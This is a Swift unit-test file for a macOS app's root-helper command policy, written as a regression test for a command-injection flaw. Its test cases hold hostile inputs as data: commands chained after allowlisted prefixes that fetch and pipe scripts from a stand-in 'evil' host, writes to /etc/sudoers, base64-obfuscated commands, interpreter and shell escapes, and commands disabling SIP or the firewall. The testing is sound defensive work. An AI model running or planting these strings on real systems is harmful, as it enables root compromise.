import XCTest
@testable import FocusLockShared

/// Covers the one piece of logic standing between an XPC caller and a root shell.
///
/// The first test here is the regression test for the real vulnerability this type was extracted
/// to fix: the allowlist used to be a `hasPrefix` match on the whole command line, and approved
/// commands were run through `/bin/bash -l -c`. Anything after a `;` following an allowlisted
/// prefix therefore executed as root. Every "injection" case below MUST stay denied.
final class CommandPolicyTests: XCTestCase {

    private func isDenied(_ command: String) -> Bool {
        if case .denied = CommandPolicy.evaluate(command: command) { return true }
        return false
    }

    private func isAllowed(_ command: String) -> Bool {
        if case .allowed = CommandPolicy.evaluate(command: command) { return true }
        return false
    }

    private func needsReview(_ command: String) -> Bool {
        if case .needsReview = CommandPolicy.evaluate(command: command) { return true }
        return false
    }

    // MARK: - The actual exploit

    func testAllowlistPrefixCannotSmuggleASecondCommand() {
        // Each of these begins with a genuinely allowlisted prefix. Under the old prefix+shell
        // design every one of them ran its tail as root.
        XCTAssertTrue(isDenied("softwareupdate ; touch /tmp/pwned"))
        XCTAssertTrue(isDenied("softwareupdate -l && curl http://evil/p.sh | sh"))
        XCTAssertTrue(isDenied("softwareupdate $(curl -s http://evil/cmd)"))
        XCTAssertTrue(isDenied("softwareupdate -l | bash"))
        XCTAssertTrue(isDenied("softwareupdate\n/bin/sh"))
        XCTAssertTrue(isDenied("softwareupdate `id > /tmp/x`"))
        XCTAssertTrue(isDenied("brew install wget; launchctl bootout system/app.otterling.helperd"))
        XCTAssertTrue(isDenied("brew update > /etc/sudoers"))
    }

    func testDenylistCannotBeEvadedByRuntimeAssembly() {
        // The old denylist was a substring match on a string that a shell then executed, so a
        // denylisted word could be assembled at runtime. With metacharacters refused there is no
        // shell left to assemble anything, so these are refused at the metacharacter stage --
        // which is the point: the denylist is no longer load-bearing on its own.
        XCTAssertTrue(isDenied("softwareupdate ; eval \"$(printf 'launchctl bootout')\""))
        XCTAssertTrue(isDenied("sh -c \"$(echo bGF1bmNoY3RsIA== | base64 -d)\""))
    }

    // MARK: - Metacharacters

    func testEveryShellMetacharacterIsRefused() {
        for character in CommandPolicy.forbiddenCharacters where character != "\0" {
            XCTAssertTrue(
                isDenied("softwareupdate \(character) whatever"),
                "metacharacter \(character.debugDescription) was not refused"
            )
        }
    }

    // MARK: - Denylist still holds for direct attempts

    func testDirectAttemptsAtThisAppAndSecurityPrimitivesAreDenied() {
        XCTAssertTrue(isDenied("launchctl bootout system/app.otterling.helperd"))
        XCTAssertTrue(isDenied("pfctl -d"))
        XCTAssertTrue(isDenied("csrutil disable"))
        XCTAssertTrue(isDenied("visudo"))
        XCTAssertTrue(isDenied("dseditgroup -o edit -a someone -t user admin"))
        XCTAssertTrue(isDenied("tccutil reset All"))
        XCTAssertTrue(isDenied("rm -rf /Applications/Otterling.app"))
        XCTAssertTrue(isDenied("profiles remove -identifier app.otterling.lockprofile"))
    }

    func testAShellIsNeverAnApprovableTarget() {
        XCTAssertTrue(isDenied("bash"))
        XCTAssertTrue(isDenied("/bin/bash"))
        XCTAssertTrue(isDenied("sh -i"))
        XCTAssertTrue(isDenied("zsh"))
        // A path prefix must not evade the check -- this case is why the rule matches on basename
        // rather than on an anchored regex over the whole command line.
        XCTAssertTrue(isDenied("/usr/bin/env bash"))
        XCTAssertTrue(isDenied("/bin/zsh -c"))
    }

    func testInterpretersAndCommandEscapesAreDenied() {
        // argv-only execution removes the shell, not every route to arbitrary root code. None of
        // these need a single metacharacter: the caller writes the script as an unprivileged user
        // and asks the broker to run the interpreter on it.
        XCTAssertTrue(isDenied("python3 /tmp/attacker.py"))
        XCTAssertTrue(isDenied("/usr/bin/python3 /tmp/attacker.py"))
        XCTAssertTrue(isDenied("perl /tmp/x.pl"))
        XCTAssertTrue(isDenied("ruby /tmp/x.rb"))
        XCTAssertTrue(isDenied("osascript /tmp/x.scpt"))
        XCTAssertTrue(isDenied("node /tmp/x.js"))
        // Documented shell escapes inside otherwise-innocuous utilities.
        XCTAssertTrue(isDenied("find /tmp -exec /tmp/x {} +"))
        XCTAssertTrue(isDenied("awk -f /tmp/x.awk"))
        XCTAssertTrue(isDenied("xargs /tmp/x"))
        XCTAssertTrue(isDenied("vim /etc/hosts"))
        XCTAssertTrue(isDenied("less /etc/hosts"))
        XCTAssertTrue(isDenied("git config --global core.pager /tmp/x"))
    }

    func testEveryForbiddenExecutableIsRefusedBareAndPathPrefixed() {
        for name in CommandPolicy.forbiddenExecutables {
            XCTAssertTrue(isDenied(name), "bare '\(name)' was not refused")
            XCTAssertTrue(isDenied("/usr/local/bin/\(name) --version"), "path-prefixed '\(name)' was not refused")
        }
    }

    // MARK: - Allowlist behaves as an allowlist

    func testAllowlistAcceptsExactSubcommandsOnly() {
        XCTAssertTrue(isAllowed("brew install wget"))
        XCTAssertTrue(isAllowed("brew upgrade"))
        XCTAssertTrue(isAllowed("softwareupdate -l"))
        XCTAssertTrue(isAllowed("softwareupdate --install --all"))

        // A brew subcommand that is not on the list is refused rather than falling through to AI
        // review -- an allowlisted executable must not become a wildcard.
        XCTAssertTrue(isDenied("brew services start something"))
        XCTAssertTrue(isDenied("brew"))
    }

    func testAllowlistMatchesBasenameNotPrefixOfCommandLine() {
        // An absolute path to a real brew is fine...
        XCTAssertTrue(isAllowed("/opt/homebrew/bin/brew install wget"))
        // ...but a program whose name merely starts with an allowlisted word is not allowlisted.
        XCTAssertTrue(needsReview("brewdo something"))
        XCTAssertTrue(needsReview("softwareupdated-helper --flag"))
        // ...and an allowlisted basename reached via a path is still subcommand-checked.
        XCTAssertTrue(isDenied("/opt/homebrew/bin/brew services start x"))
    }

    func testUnrecognizedCommandsGoToReviewWithParsedArgv() {
        guard case .needsReview(let argv) = CommandPolicy.evaluate(command: "installer -pkg /tmp/a.pkg -target /") else {
            return XCTFail("expected an unrecognized command to be routed to AI review")
        }
        XCTAssertEqual(argv, ["installer", "-pkg", "/tmp/a.pkg", "-target", "/"])
    }

    func testEmptyAndWhitespaceAreDenied() {
        XCTAssertTrue(isDenied(""))
        XCTAssertTrue(isDenied("    "))
        XCTAssertTrue(isDenied("\n\t "))
    }

    // MARK: - Fail-toward-deny on a broken pattern

    func testABrokenRegexCountsAsAMatch() {
        // A malformed denylist pattern must not silently stop denying.
        XCTAssertTrue(CommandPolicy.matches(pattern: "([unclosed", in: "anything at all"))
    }
}
